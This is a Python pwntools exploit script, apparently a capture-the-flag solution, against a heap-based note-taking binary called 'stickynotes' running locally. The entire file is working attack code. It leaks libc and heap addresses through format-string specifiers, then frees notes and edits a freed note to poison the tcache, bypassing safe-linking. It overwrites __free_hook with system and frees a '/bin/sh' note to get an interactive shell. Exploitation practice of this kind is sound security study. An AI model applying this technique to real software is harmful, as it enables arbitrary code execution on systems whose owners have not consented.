from pwn import *

# Context settings
context.binary = './stickynotes'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./stickynotes')
libc = ELF('/lib64/libc.so.6')
# context.log_level = 'debug'  # Uncomment for verbose logging

# === CONFIG ===
BINARY = './stickynotes'
HOST = 'localhost'
PORT = 5415

# === HELPER ===
def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY)

def start_gdb():
    return gdb.debug(BINARY, '''
        break main
        continue
    ''')

# === EXPLOIT ===

def exploit(p):
    #Leak libc __libc_start_main
    p.sendline(b"new")
    p.sendline(b"%11$p")
    p.sendline(b"view")
    p.sendline(b'1')
    p.recvuntil(b"0x")
    __libc_start_main = int(p.recv(12),16)
    print(f"[*] Leaked __libc_start_main: {hex(__libc_start_main)}")
    #Calculate __free_hook + system
    libc_base = __libc_start_main - libc.symbols['__libc_start_main'] - 0xe5
    print(f"[*] Leaked libc base: {hex(libc_base)}")
    __free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']
    print(f"[*] Leaked __free_hook: {hex(__free_hook)}")
    print(f"[*] Leaked system: {hex(system)}")
    #Allocate vuln and leak chunk address
    p.sendline(b"new")
    p.sendline(b"%7$p")
    p.sendline(b"view")
    p.sendline(b'2')
    p.recvuntil(b"0x")
    chunk = int(p.recv(12),16) - 0x10
    print(f"Leaked chunk address: {hex(chunk)}")
    #free both chunks
    p.sendline(b"delete")
    p.sendline(b'1')
    p.sendline(b"delete")
    p.sendline(b'2')
    #UAF -> tcache poison
    p.sendline(b"edit")
    p.sendline(b'2')
    payload = p64(__free_hook ^ (chunk >> 12))
    payload = payload.rstrip(b'\x00')
    p.sendline(payload)
    #Set __free_hook to system
    p.sendline(b"new")
    p.sendline(b"/bin/sh")
    p.sendline(b"new")
    payload = p64(system).rstrip(b'\x00')
    p.sendline(payload)
    #pop shell by freeing /bin/sh
    p.sendline(b"delete")
    p.sendline(b'3')

    p.interactive()



# === MAIN ===
if __name__ == '__main__':
    if args.GDB:
        p = start_gdb()
    else:
        p = conn()
    exploit(p)
